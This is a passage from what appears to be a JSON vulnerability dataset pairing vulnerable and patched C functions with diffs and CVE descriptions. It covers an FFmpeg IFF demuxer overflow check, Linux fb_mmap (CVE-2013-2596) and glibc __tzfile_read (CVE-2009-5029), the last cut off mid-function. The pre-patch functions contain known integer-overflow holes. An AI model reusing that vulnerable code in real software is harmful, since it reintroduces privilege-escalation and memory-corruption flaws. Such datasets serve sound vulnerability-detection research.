COMP_FIB:\n            st->codec->codec_id = AV_CODEC_ID_8SVX_FIB;\n            break;\n        case COMP_EXP:\n            st->codec->codec_id = AV_CODEC_ID_8SVX_EXP;\n            break;\n        default:\n            av_log(s, AV_LOG_ERROR,\n                   \"Unknown SVX8 compression method '%d'\\n\", iff->svx8_compression);\n            return -1;\n        }\n        }\n\n        st->codec->bits_per_coded_sample = av_get_bits_per_sample(st->codec->codec_id);\n        st->codec->bit_rate = st->codec->channels * st->codec->sample_rate * st->codec->bits_per_coded_sample;\n        st->codec->block_align = st->codec->channels * st->codec->bits_per_coded_sample;\n        break;\n\n    case AVMEDIA_TYPE_VIDEO:\n        iff->bpp          = st->codec->bits_per_coded_sample;\n        if ((screenmode & 0x800 /* Hold And Modify */) && iff->bpp <= 8) {\n            iff->ham      = iff->bpp > 6 ? 6 : 4;\n            st->codec->bits_per_coded_sample = 24;\n        }\n        iff->flags        = (screenmode & 0x80 /* Extra HalfBrite */) && iff->bpp <= 8;\n        iff->masking      = masking;\n        iff->transparency = transparency;\n\n        if (!st->codec->extradata) {\n            st->codec->extradata_size = IFF_EXTRA_VIDEO_SIZE;\n            st->codec->extradata      = av_malloc(IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n            if (!st->codec->extradata)\n                return AVERROR(ENOMEM);\n        }\n        buf = st->codec->extradata;\n        bytestream_put_be16(&buf, IFF_EXTRA_VIDEO_SIZE);\n        bytestream_put_byte(&buf, iff->bitmap_compression);\n        bytestream_put_byte(&buf, iff->bpp);\n        bytestream_put_byte(&buf, iff->ham);\n        bytestream_put_byte(&buf, iff->flags);\n        bytestream_put_be16(&buf, iff->transparency);\n        bytestream_put_byte(&buf, iff->masking);\n        bytestream_put_buffer(&buf, iff->tvdc, sizeof(iff->tvdc));\n        st->codec->codec_id = AV_CODEC_ID_IFF_ILBM;\n        break;\n    default:\n        return -1;\n    }\n\n    return 0;\n}",
        "func": "static int iff_read_header(AVFormatContext *s)\n{\n    IffDemuxContext *iff = s->priv_data;\n    AVIOContext *pb = s->pb;\n    AVStream *st;\n    uint8_t *buf;\n    uint32_t chunk_id, data_size;\n    uint32_t screenmode = 0, num, den;\n    unsigned transparency = 0;\n    unsigned masking = 0; // no mask\n    uint8_t fmt[16];\n    int fmt_size;\n\n    st = avformat_new_stream(s, NULL);\n    if (!st)\n        return AVERROR(ENOMEM);\n\n    st->codec->channels = 1;\n    st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n    avio_skip(pb, 8);\n    // codec_tag used by ByteRun1 decoder to distinguish progressive (PBM) and interlaced (ILBM) content\n    st->codec->codec_tag = avio_rl32(pb);\n    iff->bitmap_compression = -1;\n    iff->svx8_compression = -1;\n    iff->maud_bits = -1;\n    iff->maud_compression = -1;\n\n    while(!url_feof(pb)) {\n        uint64_t orig_pos;\n        int res;\n        const char *metadata_tag = NULL;\n        chunk_id = avio_rl32(pb);\n        data_size = avio_rb32(pb);\n        orig_pos = avio_tell(pb);\n\n        switch(chunk_id) {\n        case ID_VHDR:\n            st->codec->codec_type = AVMEDIA_TYPE_AUDIO;\n\n            if (data_size < 14)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 12);\n            st->codec->sample_rate = avio_rb16(pb);\n            if (data_size >= 16) {\n                avio_skip(pb, 1);\n                iff->svx8_compression = avio_r8(pb);\n            }\n            break;\n\n        case ID_MHDR:\n            st->codec->codec_type = AVMEDIA_TYPE_AUDIO;\n\n            if (data_size < 32)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 4);\n            iff->maud_bits = avio_rb16(pb);\n            avio_skip(pb, 2);\n            num = avio_rb32(pb);\n            den = avio_rb16(pb);\n            if (!den)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 2);\n            st->codec->sample_rate = num / den;\n            st->codec->channels = avio_rb16(pb);\n            iff->maud_compression = avio_rb16(pb);\n            if (st->codec->channels == 1)\n                st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n            else if (st->codec->channels == 2)\n                st->codec->channel_layout = AV_CH_LAYOUT_STEREO;\n            break;\n\n        case ID_ABIT:\n        case ID_BODY:\n        case ID_DBOD:\n        case ID_MDAT:\n            iff->body_pos = avio_tell(pb);\n            iff->body_end = iff->body_pos + data_size;\n            iff->body_size = data_size;\n            break;\n\n        case ID_CHAN:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            if (avio_rb32(pb) < 6) {\n                st->codec->channels       = 1;\n                st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n            } else {\n                st->codec->channels       = 2;\n                st->codec->channel_layout = AV_CH_LAYOUT_STEREO;\n            }\n            break;\n\n        case ID_CAMG:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            screenmode                = avio_rb32(pb);\n            break;\n\n        case ID_CMAP:\n            if (data_size > INT_MAX - IFF_EXTRA_VIDEO_SIZE - FF_INPUT_BUFFER_PADDING_SIZE)\n                return AVERROR_INVALIDDATA;\n            st->codec->extradata_size = data_size + IFF_EXTRA_VIDEO_SIZE;\n            st->codec->extradata      = av_malloc(data_size + IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n            if (!st->codec->extradata)\n                return AVERROR(ENOMEM);\n            if (avio_read(pb, st->codec->extradata + IFF_EXTRA_VIDEO_SIZE, data_size) < 0)\n                return AVERROR(EIO);\n            break;\n\n        case ID_BMHD:\n            st->codec->codec_type            = AVMEDIA_TYPE_VIDEO;\n            if (data_size <= 8)\n                return AVERROR_INVALIDDATA;\n            st->codec->width                 = avio_rb16(pb);\n            st->codec->height                = avio_rb16(pb);\n            avio_skip(pb, 4); // x, y offset\n            st->codec->bits_per_coded_sample = avio_r8(pb);\n            if (data_size >= 10)\n                masking                      = avio_r8(pb);\n            if (data_size >= 11)\n                iff->bitmap_compression      = avio_r8(pb);\n            if (data_size >= 14) {\n                avio_skip(pb, 1); // padding\n                transparency                 = avio_rb16(pb);\n            }\n            if (data_size >= 16) {\n                st->sample_aspect_ratio.num  = avio_r8(pb);\n                st->sample_aspect_ratio.den  = avio_r8(pb);\n            }\n            break;\n\n        case ID_DPEL:\n            if (data_size < 4 || (data_size & 3))\n                return AVERROR_INVALIDDATA;\n            if ((fmt_size = avio_read(pb, fmt, sizeof(fmt))) < 0)\n                return fmt_size;\n            if (fmt_size == sizeof(deep_rgb24) && !memcmp(fmt, deep_rgb24, sizeof(deep_rgb24)))\n                st->codec->pix_fmt = AV_PIX_FMT_RGB24;\n            else if (fmt_size == sizeof(deep_rgba) && !memcmp(fmt, deep_rgba, sizeof(deep_rgba)))\n                st->codec->pix_fmt = AV_PIX_FMT_RGBA;\n            else if (fmt_size == sizeof(deep_bgra) && !memcmp(fmt, deep_bgra, sizeof(deep_bgra)))\n                st->codec->pix_fmt = AV_PIX_FMT_BGRA;\n            else if (fmt_size == sizeof(deep_argb) && !memcmp(fmt, deep_argb, sizeof(deep_argb)))\n                st->codec->pix_fmt = AV_PIX_FMT_ARGB;\n            else if (fmt_size == sizeof(deep_abgr) && !memcmp(fmt, deep_abgr, sizeof(deep_abgr)))\n                st->codec->pix_fmt = AV_PIX_FMT_ABGR;\n            else {\n                av_log_ask_for_sample(s, \"unsupported color format\\n\");\n                return AVERROR_PATCHWELCOME;\n            }\n            break;\n\n        case ID_DGBL:\n            st->codec->codec_type            = AVMEDIA_TYPE_VIDEO;\n            if (data_size < 8)\n                return AVERROR_INVALIDDATA;\n            st->codec->width                 = avio_rb16(pb);\n            st->codec->height                = avio_rb16(pb);\n            iff->bitmap_compression          = avio_rb16(pb);\n            st->sample_aspect_ratio.num      = avio_r8(pb);\n            st->sample_aspect_ratio.den      = avio_r8(pb);\n            st->codec->bits_per_coded_sample = 24;\n            break;\n\n        case ID_DLOC:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            st->codec->width  = avio_rb16(pb);\n            st->codec->height = avio_rb16(pb);\n            break;\n\n        case ID_TVDC:\n            if (data_size < sizeof(iff->tvdc))\n                return AVERROR_INVALIDDATA;\n            res = avio_read(pb, iff->tvdc, sizeof(iff->tvdc));\n            if (res < 0)\n                return res;\n            break;\n\n        case ID_ANNO:\n        case ID_TEXT:      metadata_tag = \"comment\";   break;\n        case ID_AUTH:      metadata_tag = \"artist\";    break;\n        case ID_COPYRIGHT: metadata_tag = \"copyright\"; break;\n        case ID_NAME:      metadata_tag = \"title\";     break;\n        }\n\n        if (metadata_tag) {\n            if ((res = get_metadata(s, metadata_tag, data_size)) < 0) {\n                av_log(s, AV_LOG_ERROR, \"cannot allocate metadata tag %s!\\n\", metadata_tag);\n                return res;\n            }\n        }\n        avio_skip(pb, data_size - (avio_tell(pb) - orig_pos) + (data_size & 1));\n    }\n\n    avio_seek(pb, iff->body_pos, SEEK_SET);\n\n    switch(st->codec->codec_type) {\n    case AVMEDIA_TYPE_AUDIO:\n        avpriv_set_pts_info(st, 32, 1, st->codec->sample_rate);\n\n        if (st->codec->codec_tag == ID_16SV)\n            st->codec->codec_id = AV_CODEC_ID_PCM_S16BE_PLANAR;\n        else if (st->codec->codec_tag == ID_MAUD) {\n            if (iff->maud_bits == 8 && !iff->maud_compression) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_U8;\n            } else if (iff->maud_bits == 16 && !iff->maud_compression) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_S16BE;\n            } else if (iff->maud_bits ==  8 && iff->maud_compression == 2) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_ALAW;\n            } else if (iff->maud_bits ==  8 && iff->maud_compression == 3) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_MULAW;\n            } else {\n                av_log_ask_for_sample(s, \"unsupported compression %d and bit depth %d\\n\", iff->maud_compression, iff->maud_bits);\n                return AVERROR_PATCHWELCOME;\n            }\n\n            st->codec->bits_per_coded_sample =\n                av_get_bits_per_sample(st->codec->codec_id);\n\n            st->codec->block_align =\n                st->codec->bits_per_coded_sample * st->codec->channels / 8;\n        } else {\n        switch (iff->svx8_compression) {\n        case COMP_NONE:\n            st->codec->codec_id = AV_CODEC_ID_PCM_S8_PLANAR;\n            break;\n        case COMP_FIB:\n            st->codec->codec_id = AV_CODEC_ID_8SVX_FIB;\n            break;\n        case COMP_EXP:\n            st->codec->codec_id = AV_CODEC_ID_8SVX_EXP;\n            break;\n        default:\n            av_log(s, AV_LOG_ERROR,\n                   \"Unknown SVX8 compression method '%d'\\n\", iff->svx8_compression);\n            return -1;\n        }\n        }\n\n        st->codec->bits_per_coded_sample = av_get_bits_per_sample(st->codec->codec_id);\n        st->codec->bit_rate = st->codec->channels * st->codec->sample_rate * st->codec->bits_per_coded_sample;\n        st->codec->block_align = st->codec->channels * st->codec->bits_per_coded_sample;\n        break;\n\n    case AVMEDIA_TYPE_VIDEO:\n        iff->bpp          = st->codec->bits_per_coded_sample;\n        if ((screenmode & 0x800 /* Hold And Modify */) && iff->bpp <= 8) {\n            iff->ham      = iff->bpp > 6 ? 6 : 4;\n            st->codec->bits_per_coded_sample = 24;\n        }\n        iff->flags        = (screenmode & 0x80 /* Extra HalfBrite */) && iff->bpp <= 8;\n        iff->masking      = masking;\n        iff->transparency = transparency;\n\n        if (!st->codec->extradata) {\n            st->codec->extradata_size = IFF_EXTRA_VIDEO_SIZE;\n            st->codec->extradata      = av_malloc(IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n            if (!st->codec->extradata)\n                return AVERROR(ENOMEM);\n        }\n        av_assert0(st->codec->extradata_size >= IFF_EXTRA_VIDEO_SIZE);\n        buf = st->codec->extradata;\n        bytestream_put_be16(&buf, IFF_EXTRA_VIDEO_SIZE);\n        bytestream_put_byte(&buf, iff->bitmap_compression);\n        bytestream_put_byte(&buf, iff->bpp);\n        bytestream_put_byte(&buf, iff->ham);\n        bytestream_put_byte(&buf, iff->flags);\n        bytestream_put_be16(&buf, iff->transparency);\n        bytestream_put_byte(&buf, iff->masking);\n        bytestream_put_buffer(&buf, iff->tvdc, sizeof(iff->tvdc));\n        st->codec->codec_id = AV_CODEC_ID_IFF_ILBM;\n        break;\n    default:\n        return -1;\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -97,6 +97,8 @@\n             break;\n \n         case ID_CMAP:\n+            if (data_size > INT_MAX - IFF_EXTRA_VIDEO_SIZE - FF_INPUT_BUFFER_PADDING_SIZE)\n+                return AVERROR_INVALIDDATA;\n             st->codec->extradata_size = data_size + IFF_EXTRA_VIDEO_SIZE;\n             st->codec->extradata      = av_malloc(data_size + IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n             if (!st->codec->extradata)\n@@ -257,6 +259,7 @@\n             if (!st->codec->extradata)\n                 return AVERROR(ENOMEM);\n         }\n+        av_assert0(st->codec->extradata_size >= IFF_EXTRA_VIDEO_SIZE);\n         buf = st->codec->extradata;\n         bytestream_put_be16(&buf, IFF_EXTRA_VIDEO_SIZE);\n         bytestream_put_byte(&buf, iff->bitmap_compression);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "            if (data_size > INT_MAX - IFF_EXTRA_VIDEO_SIZE - FF_INPUT_BUFFER_PADDING_SIZE)",
                "                return AVERROR_INVALIDDATA;",
                "        av_assert0(st->codec->extradata_size >= IFF_EXTRA_VIDEO_SIZE);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-2596",
        "func_name": "torvalds/linux/fb_mmap",
        "description": "Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.",
        "git_url": "https://github.com/torvalds/linux/commit/fc9bbca8f650e5f738af8806317c0a041a48ae4a",
        "commit_title": "vm: convert fb_mmap to vm_iomap_memory() helper",
        "commit_text": " This is my example conversion of a few existing mmap users.  The fb_mmap() case is a good example because it is a bit more complicated than some: fb_mmap() mmaps one of two different memory areas depending on the page offset of the mmap (but happily there is never any mixing of the two, so the helper function still works). ",
        "func_before": "static int\nfb_mmap(struct file *file, struct vm_area_struct * vma)\n{\n\tstruct fb_info *info = file_fb_info(file);\n\tstruct fb_ops *fb;\n\tunsigned long off;\n\tunsigned long start;\n\tu32 len;\n\n\tif (!info)\n\t\treturn -ENODEV;\n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))\n\t\treturn -EINVAL;\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n\tfb = info->fbops;\n\tif (!fb)\n\t\treturn -ENODEV;\n\tmutex_lock(&info->mm_lock);\n\tif (fb->fb_mmap) {\n\t\tint res;\n\t\tres = fb->fb_mmap(info, vma);\n\t\tmutex_unlock(&info->mm_lock);\n\t\treturn res;\n\t}\n\n\t/* frame buffer memory */\n\tstart = info->fix.smem_start;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);\n\tif (off >= len) {\n\t\t/* memory mapped io */\n\t\toff -= len;\n\t\tif (info->var.accel_flags) {\n\t\t\tmutex_unlock(&info->mm_lock);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tstart = info->fix.mmio_start;\n\t\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);\n\t}\n\tmutex_unlock(&info->mm_lock);\n\tstart &= PAGE_MASK;\n\tif ((vma->vm_end - vma->vm_start + off) > len)\n\t\treturn -EINVAL;\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n\t/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/\n\tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n\tfb_pgprotect(file, vma, off);\n\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t     vma->vm_end - vma->vm_start, vma->vm_page_prot))\n\t\treturn -EAGAIN;\n\treturn 0;\n}",
        "func": "static int\nfb_mmap(struct file *file, struct vm_area_struct * vma)\n{\n\tstruct fb_info *info = file_fb_info(file);\n\tstruct fb_ops *fb;\n\tunsigned long mmio_pgoff;\n\tunsigned long start;\n\tu32 len;\n\n\tif (!info)\n\t\treturn -ENODEV;\n\tfb = info->fbops;\n\tif (!fb)\n\t\treturn -ENODEV;\n\tmutex_lock(&info->mm_lock);\n\tif (fb->fb_mmap) {\n\t\tint res;\n\t\tres = fb->fb_mmap(info, vma);\n\t\tmutex_unlock(&info->mm_lock);\n\t\treturn res;\n\t}\n\n\t/*\n\t * Ugh. This can be either the frame buffer mapping, or\n\t * if pgoff points past it, the mmio mapping.\n\t */\n\tstart = info->fix.smem_start;\n\tlen = info->fix.smem_len;\n\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;\n\tif (vma->vm_pgoff >= mmio_pgoff) {\n\t\tvma->vm_pgoff -= mmio_pgoff;\n\t\tstart = info->fix.mmio_start;\n\t\tlen = info->fix.mmio_len;\n\t}\n\tmutex_unlock(&info->mm_lock);\n\n\tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n\tfb_pgprotect(file, vma, start);\n\n\treturn vm_iomap_memory(vma, start, len);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,15 +3,12 @@\n {\n \tstruct fb_info *info = file_fb_info(file);\n \tstruct fb_ops *fb;\n-\tunsigned long off;\n+\tunsigned long mmio_pgoff;\n \tunsigned long start;\n \tu32 len;\n \n \tif (!info)\n \t\treturn -ENODEV;\n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))\n-\t\treturn -EINVAL;\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n \tfb = info->fbops;\n \tif (!fb)\n \t\treturn -ENODEV;\n@@ -23,30 +20,22 @@\n \t\treturn res;\n \t}\n \n-\t/* frame buffer memory */\n+\t/*\n+\t * Ugh. This can be either the frame buffer mapping, or\n+\t * if pgoff points past it, the mmio mapping.\n+\t */\n \tstart = info->fix.smem_start;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);\n-\tif (off >= len) {\n-\t\t/* memory mapped io */\n-\t\toff -= len;\n-\t\tif (info->var.accel_flags) {\n-\t\t\tmutex_unlock(&info->mm_lock);\n-\t\t\treturn -EINVAL;\n-\t\t}\n+\tlen = info->fix.smem_len;\n+\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;\n+\tif (vma->vm_pgoff >= mmio_pgoff) {\n+\t\tvma->vm_pgoff -= mmio_pgoff;\n \t\tstart = info->fix.mmio_start;\n-\t\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);\n+\t\tlen = info->fix.mmio_len;\n \t}\n \tmutex_unlock(&info->mm_lock);\n-\tstart &= PAGE_MASK;\n-\tif ((vma->vm_end - vma->vm_start + off) > len)\n-\t\treturn -EINVAL;\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\t/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/\n+\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n-\tfb_pgprotect(file, vma, off);\n-\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t     vma->vm_end - vma->vm_start, vma->vm_page_prot))\n-\t\treturn -EAGAIN;\n-\treturn 0;\n+\tfb_pgprotect(file, vma, start);\n+\n+\treturn vm_iomap_memory(vma, start, len);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tunsigned long off;",
                "\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))",
                "\t\treturn -EINVAL;",
                "\toff = vma->vm_pgoff << PAGE_SHIFT;",
                "\t/* frame buffer memory */",
                "\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);",
                "\tif (off >= len) {",
                "\t\t/* memory mapped io */",
                "\t\toff -= len;",
                "\t\tif (info->var.accel_flags) {",
                "\t\t\tmutex_unlock(&info->mm_lock);",
                "\t\t\treturn -EINVAL;",
                "\t\t}",
                "\t\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);",
                "\tstart &= PAGE_MASK;",
                "\tif ((vma->vm_end - vma->vm_start + off) > len)",
                "\t\treturn -EINVAL;",
                "\toff += start;",
                "\tvma->vm_pgoff = off >> PAGE_SHIFT;",
                "\t/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/",
                "\tfb_pgprotect(file, vma, off);",
                "\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,",
                "\t\t\t     vma->vm_end - vma->vm_start, vma->vm_page_prot))",
                "\t\treturn -EAGAIN;",
                "\treturn 0;"
            ],
            "added_lines": [
                "\tunsigned long mmio_pgoff;",
                "\t/*",
                "\t * Ugh. This can be either the frame buffer mapping, or",
                "\t * if pgoff points past it, the mmio mapping.",
                "\t */",
                "\tlen = info->fix.smem_len;",
                "\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;",
                "\tif (vma->vm_pgoff >= mmio_pgoff) {",
                "\t\tvma->vm_pgoff -= mmio_pgoff;",
                "\t\tlen = info->fix.mmio_len;",
                "",
                "\tfb_pgprotect(file, vma, start);",
                "",
                "\treturn vm_iomap_memory(vma, start, len);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-5029",
        "func_name": "glibc/__tzfile_read",
        "description": "Integer overflow in the __tzfile_read function in glibc before 2.15 allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted timezone (TZ) file, as demonstrated using vsftpd.",
        "git_url": "http://sourceware.org/git/?p=glibc.git;a=commit;h=97ac2654b2d831acaa18a2b018b0736245903fd2",
        "commit_title": "",
        "commit_text": "Check values from TZ file header ",
        "func_before": "void\n__tzfile_read (const char *file, size_t extra, char **extrap)\n{\n  static const char default_tzdir[] = TZDIR;\n  size_t num_isstd, num_isgmt;\n  register FILE *f;\n  struct tzhead tzhead;\n  size_t chars;\n  register size_t i;\n  size_t total_size;\n  size_t types_idx;\n  size_t leaps_idx;\n  int was_using_tzfile = __use_tzfile;\n  int trans_width = 4;\n  size_t tzspec_len;\n\n  if (sizeof (time_t) != 4 && sizeof (time_t) != 8)\n    abort ();\n\n  __use_tzfile = 0;\n\n  if (file == NULL)\n    /* No user specification; use the site-wide default.  */\n    file = TZDEFAULT;\n  else if (*file == '\\0')\n    /* User specified the empty string; use UTC with no leap seconds.  */\n    goto ret_free_transitions;\n  else\n    {\n      /* We must not allow to read an arbitrary file in a setuid\n\t program.  So we fail for any file which is not in the\n\t directory hierachy starting at TZDIR\n\t and which is not the system wide default TZDEFAULT.  */\n      if (__libc_enable_secure\n\t  && ((*file == '/'\n\t       && memcmp (file, TZDEFAULT, sizeof TZDEFAULT)\n\t       && memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))\n\t      || strstr (file, \"../\") != NULL))\n\t/* This test is certainly a bit too restrictive but it should\n\t   catch all critical cases.  */\n\tgoto ret_free_transitions;\n    }\n\n  if (*file != '/')\n    {\n      const char *tzdir;\n      unsigned int len, tzdir_len;\n      char *new, *tmp;\n\n      tzdir = getenv (\"TZDIR\");\n      if (tzdir == NULL || *tzdir == '\\0')\n\t{\n\t  tzdir = default_tzdir;\n\t  tzdir_len = sizeof (default_tzdir) - 1;\n\t}\n      else\n\ttzdir_len = strlen (tzdir);\n      len = strlen (file) + 1;\n      new = (char *) __alloca (tzdir_len + 1 + len);\n      tmp = __mempcpy (new, tzdir, tzdir_len);\n      *tmp++ = '/';\n      memcpy (tmp, file, len);\n      file = new;\n    }\n\n  /* If we were already using tzfile, check whether the file changed.  */\n  struct stat64 st;\n  if (was_using_tzfile\n      && stat64 (file, &st) == 0\n      && tzfile_ino == st.st_ino && tzfile_dev == st.st_dev\n      && tzfile_mtime == st.st_mtime)\n    {\n      /* Nothing to do.  */\n      __use_tzfile = 1;\n      return;\n    }\n\n  /* Note the file is opened with cancellation in the I/O functions\n     disabled and if available FD_CLOEXEC set.  */\n  f = fopen (file, \"rce\");\n  if (f == NULL)\n    goto ret_free_transitions;\n\n  /* Get information about the file we are actually using.  */\n  if (fstat64 (fileno (f), &st) != 0)\n    {\n      fclose (f);\n      goto ret_free_transitions;\n    }\n\n  free ((void *) transitions);\n  transitions = NULL;\n\n  /* Remember the inode and device number and modification time.  */\n  tzfile_dev = st.st_dev;\n  tzfile_ino = st.st_ino;\n  tzfile_mtime = st.st_mtime;\n\n  /* No threads reading this stream.  */\n  __fsetlocking (f, FSETLOCKING_BYCALLER);\n\n read_again:\n  if (__builtin_expect (fread_unlocked ((void *) &tzhead, sizeof (tzhead),\n\t\t\t\t\t1, f) != 1, 0)\n      || memcmp (tzhead.tzh_magic, TZ_MAGIC, sizeof (tzhead.tzh_magic)) != 0)\n    goto lose;\n\n  num_transitions = (size_t) decode (tzhead.tzh_timecnt);\n  num_types = (size_t) decode (tzhead.tzh_typecnt);\n  chars = (size_t) decode (tzhead.tzh_charcnt);\n  num_leaps = (size_t) decode (tzhead.tzh_leapcnt);\n  num_isstd = (size_t) decode (tzhead.tzh_ttisstdcnt);\n  num_isgmt = (size_t) decode (tzhead.tzh_ttisgmtcnt);\n\n  /* For platforms with 64-bit time_t we use the new format if available.  */\n  if (sizeof (time_t) == 8 && trans_width == 4\n      && tzhead.tzh_version[0] != '\\0')\n    {\n      /* We use the 8-byte format.  */\n      trans_width = 8;\n\n      /* Position the stream before the second header.  */\n      size_t to_skip = (num_transitions * (4 + 1)\n\t\t\t+ num_types * 6\n\t\t\t+ chars\n\t\t\t+ num_leaps * 8\n\t\t\t+ num_isstd\n\t\t\t+ num_isgmt);\n      if (fseek (f, to_skip, SEEK_CUR) != 0)\n\tgoto lose;\n\n      goto read_again;\n    }\n\n  total_size = num_transitions * (sizeof (time_t) + 1);\n  total_size = ((total_size + __alignof__ (struct ttinfo) - 1)\n\t\t& ~(__alignof__ (struct ttinfo) - 1));\n  types_idx = total_size;\n  total_size += num_types * sizeof (struct ttinfo) + chars;\n  total_size = ((total_size + __alignof__ (struct leap) - 1)\n\t\t& ~(__alignof__ (struct leap) - 1));\n  leaps_idx = total_size;\n  total_size += num_leaps * sizeof (struct leap);\n  tzspec_len = (sizeof (time_t) == 8 && trans_width == 8\n\t\t? st.st_size - (ftello (f)\n\t\t\t\t+ num_transitions * (8 + 1)\n\t\t\t\t+ num_types * 6\n\t\t\t\t+ chars\n\t\t\t\t+ num_leaps * 12\n\t\t\t\t+ num_isstd\n\t\t\t\t+ num_isgmt) - 1 : 0);\n\n  /* Allocate enough memory including the extra block requested by the\n     caller.  */\n  transitions = (time_t *) malloc (total_size + tzspec_len + extra);\n  if (transitions == NULL)\n    goto lose;\n\n  type_idxs = (unsigned char *) transitions + (num_transitions\n\t\t\t\t\t       * sizeof (time_t));\n  types = (struct ttinfo *) ((char *) transitions + types_idx);\n  zone_names = (char *) types + num_types * sizeof (struct ttinfo);\n  leaps = (struct leap *) ((char *) transitions + leaps_idx);\n  if (sizeof (time_t) == 8 && trans_width == 8)\n    tzspec = (char *) leaps + num_leaps * sizeof (struct leap) + extra;\n  else\n    tzspec = NULL;\n  if (extra > 0)\n    *extrap = (char *) &leaps[num_leaps];\n\n  if (sizeof (time_t) == 4 || __builtin_expect (trans_width == 8, 1))\n    {\n      if (__builtin_expect (fread_unlocked (transitions, trans_width + 1,\n\t\t\t\t\t    num_transitions, f)\n\t\t\t    != num_transitions, 0))\n\tgoto lose;\n    }\n  else\n    {\n      if (__builtin_expect (fread_unlocked (transitions, 4, num_transitions, f)\n\t\t\t    != num_transitions, 0)\n\t  || __builtin_expect (fread_unlocked (type_idxs, 1, num_transitions,\n\t\t\t\t\t       f) != num_transitions, 0))\n\tgoto lose;\n    }\n\n  /* Check for bogus indices in the data file, so we can hereafter\n     safely use type_idxs[T] as indices into `types' and never crash.  */\n  for (i = 0; i < num_transitions; ++i)\n    if (__builtin_expect (type_idxs[i] >= num_types, 0))\n      goto lose;\n\n  if ((BYTE_ORDER != BIG_ENDIAN && (sizeof (time_t) == 4 || trans_width == 4))\n      || (BYTE_ORDER == BIG_ENDIAN && sizeof (time_t) == 8\n\t  && trans_width == 4))\n    {\n      /* Decode the transition times, stored as 4-byte integers in\n\t network (big-endian) byte order.  We work from the end of\n\t the array so as not to clobber the next element to be\n\t processed when sizeof (time_t) > 4.  */\n      i = num_transitions;\n      while (i-- > 0)\n\ttransitions[i] = decode ((char *) transitions + i * 4);\n    }\n  else if (BYTE_ORDER != BIG_ENDIAN && sizeof (time_t) == 8)\n    {\n      /* Decode the transition times, stored as 8-byte integers in\n\t network (big-endian) byte order.  */\n      for (i = 0; i < num_transitions; ++i)\n\ttransitions[i] = decode64 ((char *) transitions + i * 8);\n    }\n\n  for (i = 0; i < num_types; ++i)\n    {\n      unsigned char x[4];\n      int c;\n      if (__builtin_expect (fread_unlocked (x, 1, sizeof (x), f) != sizeof (x),\n\t\t\t    0))\n\tgoto lose;\n      c = getc_unlocked (f);\n      if (__builtin_expect ((unsigned int) c > 1u, 0))\n\tgoto lose;\n      types[i].isdst = c;\n      c = getc_unlocked (f);\n      if (__builtin_expect ((size_t) c > chars, 0))\n\t/* Bogus index in data file.  */\n\tgoto lose;\n      types[i].idx = c;\n      types[i].offset = (long int) decode (x);\n    }\n\n  if (__builtin_expect (fread_unlocked (zone_names, 1, chars, f) != chars, 0))\n    goto lose;\n\n  for (i = 0; i < num_leaps; ++i)\n    {\n      unsigned char 